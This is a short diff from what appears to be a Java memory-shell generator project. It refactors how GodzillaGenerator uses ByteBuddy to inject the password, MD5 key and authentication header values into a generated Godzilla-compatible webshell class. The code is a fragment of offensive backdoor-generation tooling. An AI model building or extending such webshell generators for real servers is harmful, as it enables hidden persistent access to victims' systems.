@@ -7,11 +7,10 @@ import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
-import net.bytebuddy.implementation.FieldAccessor;
-import net.bytebuddy.implementation.SuperMethodCall;
-import net.bytebuddy.matcher.ElementMatchers;
 import org.apache.commons.codec.digest.DigestUtils;
 import org.apache.commons.lang3.StringUtils;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
 
 /**
  * @author ReaJason
@@ -40,13 +39,11 @@ public class GodzillaGenerator {
                 .redefine(godzillaConfig.getShellClass())
                 .name(godzillaConfig.getShellClassName())
                 .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
-                .constructor(ElementMatchers.any())
-                .intercept(SuperMethodCall.INSTANCE
-                        .andThen(FieldAccessor.ofField("pass").setsValue(godzillaConfig.getPass()))
-                        .andThen(FieldAccessor.ofField("key").setsValue(md5Key))
-                        .andThen(FieldAccessor.ofField("md5").setsValue(md5))
-                        .andThen(FieldAccessor.ofField("headerName").setsValue(godzillaConfig.getHeaderName()))
-                        .andThen(FieldAccessor.ofField("headerValue").setsValue(godzillaConfig.getHeaderValue())));
+                .field(named("pass")).value(godzillaConfig.getPass())
+                .field(named("key")).value(md5Key)
+                .field(named("md5")).value(md5)
+                .field(named("headerName")).value(godzillaConfig.getHeaderName())
+                .field(named("headerValue")).value(godzillaConfig.getHeaderValue());
 
         if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
